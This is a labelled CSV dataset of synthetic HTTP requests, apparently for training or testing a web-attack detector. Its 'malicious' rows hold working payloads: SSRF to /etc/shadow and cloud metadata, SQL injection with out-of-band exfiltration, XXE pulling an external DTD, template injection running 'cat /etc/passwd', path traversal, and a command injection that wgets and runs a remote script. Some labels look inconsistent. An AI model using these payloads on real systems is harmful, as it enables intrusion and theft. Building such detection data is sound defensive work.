label,text
malicious,"GET /fetch/file%3A%2F%2F%2Fetc%2Fshadow HTTP/1.1
Host: internal-secure-gateway.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"GET /media/stream?channel=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.attacker-domain.com%255C%255Cdata%2527%2529%2529%2529--%2520 HTTP/1.1
Host: hd-video-stream.net
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Connection: close
Cookie: vid_session=036b4c5fe21d44e9b8f4b5039a1a2efa"
benign,"GET /api/v1/user/data?cmd=view_details&token=abc123efg456 HTTP/1.1
Host: rapidcloud-services.ai
User-Agent: Python-urllib/3.11
Accept: application/json
Accept-Encoding: gzip, deflate
X-Forwarded-For: 198.51.100.23
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
benign,"POST /members/upload_photo HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.87.0
Accept: */*
Referer: https://community.game-dev-forum.org/profile/edit
Origin: https://community.game-dev-forum.org
Content-Type: multipart/form-data; boundary=----WebKitBoundary123456
Cookie: gd_forum_sid=bac12aeb1c934a89874fea9b67d8123b
Connection: keep-alive

------WebKitBoundary123456
Content-Disposition: form-data; name=""image_file""; filename=""sprite_upload.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------WebKitBoundary123456
Content-Disposition: form-data; name=""caption""

New hero sprite design
------WebKitBoundary123456
Content-Disposition: form-data; name=""album_id""

58
------WebKitBoundary123456--"
malicious,"POST /api/v2/admin/feature-toggle HTTP/1.1
Host: secure-user-portal.net
User-Agent: Python-urllib/3.9
Accept: application/json
Referer: https://secure-user-portal.net/admin/feature-flags
Content-Type: application/json
Content-Length: 31

{""featureX"":true,""betaUser"":false}"
benign,"GET /robots.txt HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Accept: text/plain, */*;q=0.1
Accept-Language: en
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"POST /api/v2/user/welcome HTTP/1.1
Host: api.dynamic-content-services.ai
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://app.dynamic-content-services.ai/dashboard
Origin: https://app.dynamic-content-services.ai
Cache-Control: no-cache
Cookie: sessionId=48f2e7d09b3c4a8f9d7bcd12e45a7c3e

{
  ""user_id"": 987451,
  ""custom_greeting"": ""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!"",
  ""locale"": ""en-US"",
  ""metadata"": {
    ""source"": ""mobile_app"",
    ""version"": ""5.3.2""
  }
}"
malicious,"GET /api/get_photo?imageUrl=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: imageproc.storage-network.cloud
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Origin: https://app.storage-network.cloud"
benign,"GET /api/items/list?nextPage=ZXJkaW5nMTIzNA==&filters=eyJjYXRlZ29yeSI6ICJlY3Ryb25pY3MiLCAicHJpY2UiOiB7Im1pbiI6IDUwLCAibWF4IjogMTAwMH19 HTTP/1.1
Host: marketplace-data.io
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36
Referer: https://app.marketplace-data.io/dashboard
Connection: keep-alive"
malicious,"POST /app/xml/upload HTTP/1.1
Host: content-delivery-network.dev
User-Agent: Wget/1.21.1
Accept: */*
Cache-Control: no-cache
Content-Type: application/xml
Content-Length: 299
Connection: close

<!DOCTYPE payload [
<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % dtd SYSTEM ""http://cdn-malicious-site.info/payload.dtd"">
%dtd;
%send;
]>
<payload><item>&exfil;</item></payload>"
benign,"GET /api/v1/games?genre=strategy&limit=25&offset=50 HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NzY1MzQxMywiZXhwIjoxNzM4Mjg4ODAwfQ.CVu10qz_CnbGZkusxRSfOjlSx7_BKaHZDXuipN6vX_g
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Encoding: gzip, deflate
Connection: close"
benign,"POST /newsletter/signup HTTP/1.1
Host: daily-news-updates.org
Content-Type: application/json
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cache-Control: no-cache
Content-Length: 28

{""UNION ALL"": ""email=jane.doe@mail.com""}"
benign,"GET / HTTP/1.1
Host: daily-courier.news
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://www.bing.com/
Accept-Language: en-US,en;q=0.5
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0"
benign,"GET /catalog/items?query=kids+toys+%26+games&age_group=3-5+years HTTP/1.1
Host: bright-learning-zone.edu
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.5
Referer: https://bright-learning-zone.edu/home
Connection: keep-alive"
malicious,"POST /api/comment/submit HTTP/1.1
Host: modern-news-portal.com
Content-Type: application/json
Content-Length: 189
Accept: application/json
User-Agent: Python-urllib/3.9

{""author"": ""carter82"", ""article_id"": 6752, ""comment"": ""Interesting point! Check this URL: \u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}"
benign,"PUT /profile/settings HTTP/1.1
Host: swift-finance-app.co
User-Agent: python-requests/2.28.2
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 61
Connection: keep-alive

{""bio"": ""Financial analyst &lt;b&gt;keen on data&lt;/b&gt; and cryptos""}"
malicious,"POST /user/search HTTP/1.1
Host: directory-access-secure.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://directory-access-secure.net/login
Content-Length: 53
Connection: keep-alive

user_id=validuser%29%28objectClass%3D*%29%26attributes%3D*"
malicious,"GET /dashboard HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 <script>alert('LogViewerXSS')</script> (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /v3/user/profile?session=YXBpS2V5MTIzNDU2&prefs=eyJjb2xvciI6ImxpZ2h0IiwidWlkIjoxMjM0NX0= HTTP/1.1
Host: personalized-content-delivery.co.uk
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: keep-alive
Accept-Language: en-US,en;q=0.8"
benign,"GET /gallery/exhibits/modern-art HTTP/1.1
Host: urbanartcollective.co
Cookie: visitor_id=uk192830; gallery_mode=slideshow; last_exhibit=modern-art; sound=on
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close"
benign,"DELETE /api/v1/employees/55987 HTTP/1.1
Host: corp-hr-management.info
Authorization: Bearer AChxfYp8RmzZu91J34ketLVbREqdT0ngjsv52oqF
Accept: application/json
DNT: 1
User-Agent: curl/7.76.1
Connection: close"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Mobile Safari/537.36
Accept: application/json
Content-Type: application/json-patch+json
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.sometoken12345.token
X-Requested-With: XMLHttpRequest
Content-Length: 74
Connection: keep-alive

[{""op"": ""remove"", ""path"": ""/privacy/tracking""}, {""op"": ""replace"", ""path"": ""/privacy/location"", ""value"": true}]"
benign,"GET /products;category=books/bestsellers HTTP/1.1
Host: online-biblio-store.ca
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache
Connection: keep-alive"
malicious,"GET /files/download.php?file=../../../../../../../../etc/passwd HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: keep-alive"
malicious,"GET /docs/api?doc_id=42%250d%250aSet-Cookie%3A%20debugMode%3Dtrue HTTP/1.1
Host: dev-tools-cloud.services
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Connection: keep-alive"
benign,"GET /api/v1/weather/forecast/hourly?location=37.7749,-122.4194 HTTP/1.1
Host: global-weather-info.org
Accept: application/json
App-Secret: 84bfe2105d964a5b91fa73c8f2ea1e4c
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Cache-Control: max-age=0"
benign,"POST /api/v2/user/preferences HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
User-Agent: python-requests/2.31.0
Accept: application/json
X-CSRF-Token: 8zf6f4a9XWRLs2q94pTQ
Connection: keep-alive

email_notifications=yes&privacy_level=standard&alerts=sms"
benign,"GET /api/v3/items/list?pagination=Q29udGVudF9QYWdlXzQy&opts=eyJhY2Nlc3NJc0Vuc2FibGVkIjp0cnVlLCJuZXdGaWx0ZXJzIjpbImFjdGl2ZSIsImFsbCJdfQ== HTTP/1.1
Host: secure-media-streaming.xyz
Accept: application/json
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br, gzip, deflate
Content-Length: 69
Connection: keep-alive

nickname=PixelNinja&preferences%5Bnotifications%5D=enabled&role_id=1&internal_user_status=ACTIVE"
malicious,"POST /api/executeTask HTTP/1.1
Host: dispatch-manager.internal-cloud.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain
Origin: https://app.internal-cloud.ai
Content-Type: application/json
Content-Length: 119

{""task_id"":""restart-services"",""target_host"":""localhost || sh -c 'wget http://payload.hostedmylabs.tech/badpayload.sh -O /tmp/x.sh && sh /tmp/x.sh'""}"
benign,"GET /app/user/settings?token=thj5KwAhVmbKl4zlXvkVVIv3SDl2IoRdZmc1RLzpw2XMnYduFCAatnb6HsG7eJs8pFqUwQDXyOeZBTnJLvZYpHMsNYCgjRXLtKUcArOHVw9kqED37MPf0ibSlToGyxvy HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Connection: keep-alive
Referer: https://my-personal-blog-site.info/dashboard
DNT: 1"
malicious,"POST /member/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 329

session_settings_b64=TzoyMjoiTW9ub2xvZ1xQYXRoU3VibGluZXIiOjM6e3M6MTI6InNldHNlbmQiO3M6MTk6IlN5c3RlbVxQcml2YXRlVG9rZW4iO3M6NjoiY29va2llIjtzOjE5OiJzZXNzaW9uX2xpbmUiO31d&confirmed=yes"
benign,"GET /members/list?filter[type]=admin&filter[active]=true HTTP/1.1
Host: secure-login-system.net
User-Agent: python-requests/2.28.2
Accept: application/json
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Requested-With: XMLHttpRequest"
benign,"GET /products/electronics/tv/list?filter%5Bresolution%5D=4k&filter%5Bbrands%5D=vidaxl%7Cnokia&sort_by=rating_desc&page=1 HTTP/1.1
Host: tech-squared.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://tech-squared.org/home
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /oauth/token HTTP/1.1
Host: auth.securelogin-hub.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Authorization: Basic bXNlY3VyZUNsaWVudDpTZWNyZXQxMjM=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=4f3d9a7b2cce4&redirect_uri=https%3A%2F%2Fapp.securelogin-hub.net%2Fcallback&client_id=msclient&client_secret=Secret123"
benign,"PUT /api/v2/user/475/settings HTTP/1.1
Host: dev-environment.apps.internal
Authorization: Bearer eyJzdWIiOiJ1c2VyNDc1IiwibmFtZSI6IkpvaG4gRG9lIn0.
Origin: https://dev-environment.apps.internal
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Content-Length: 68

{""dashboardLayout"": ""compact"", ""enableBetaFeatures"": false, ""timezone"": ""America/New_York""}"
malicious,"GET /login?redirect_url=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/shopping/cart
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /api/v1/finance/transactions/recent?count=15 HTTP/1.1
Host: myfinance-data.net
Accept: application/json
X-Requested-With: XMLHttpRequest
Origin: https://app.myfinance-data.net
Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0"
malicious,"GET /public/site.shtml?template_name=default<!--#exec cmd=""/bin/uname -a""--> HTTP/1.1
Host: portal-dev-services.net
User-Agent: Lynx/2.8.9dev.15 libwww-FM/2.14
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Charset: UTF-8,ISO-8859-1;q=0.5
Cache-Control: no-cache
Connection: keep-alive"
malicious,"GET /products/details?id=10%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: catalog.gourmet-kitchen.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Cookie: sessionid=6f3d92a8c12b45d1a2cf189fa9d3e7b8; preferences=lang=en-US"
benign,"GET /content/find?query=how%20to%20bake%20bread HTTP/1.1
Host: learn-craftsmanship.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Pragma: no-cache"
benign,"GET /sitemap-main.xml HTTP/1.1
Host: fleetmodernization.biz
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept: application/xml, text/xml
Accept-Language: en-US
Cache-Control: no-cache
Connection: Keep-Alive"
benign,"GET /search?q=wireless+headphones HTTP/1.1
Host: online-retail-store.biz:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://online-retail-store.biz/
Connection: keep-alive"
benign,"POST /beacon/submit HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: text/plain
Origin: https://community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Content-Length: 46

event=post_view&postId=5982&userId=guest123&duration=45"
benign,"GET /dashboard/data?session=%4a%5b%6C%7dde3a12b9&refresh=true HTTP/1.1
Host: analytics.datastream-service.net
Accept: application/json, text/plain, */*
Authorization: Basic bWFuYWdlcjoxMjM0NQ==
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"HEAD /downloads/linux/distributions/minimal.iso HTTP/1.1
Host: distro-isos-server.org
User-Agent: aria2/1.36.0
Accept: application/octet-stream
Accept-Encoding: identity
Connection: keep-alive"
benign,"GET /resource/load?file=ebooks/fiction/collection_summer2023.epub HTTP/1.1
Host: literary-bookshelf.online
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/epub+zip,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Via: 1.1 google
Connection: close"
benign,"GET /stylesheets/theme.default.css HTTP/1.1
Host: research-data-portal.net
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://research-data-portal.net/datasets/health-stats
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
benign,"PATCH /api/v1/inventory/special-items/78012 HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer mnbvcxzlkjhgfdsapoiuytrewq1234567890
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Content-Length: 43

{""stock_level"":150,""discount_active"":true}"
malicious,"POST /api/update_profile HTTP/1.1
Host: data-insights-platform.tech
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/xml, text/xml, */*
Content-Type: text/plain
Content-Length: 90
Cookie: di_token=def456xyz123abc789token
Connection: close

user%5Bemail%5D=analyst%40data-platform.tech&user%5Bis_analyst%5D=1&user%5Bprofile%5D%5Bverified%5D=true"
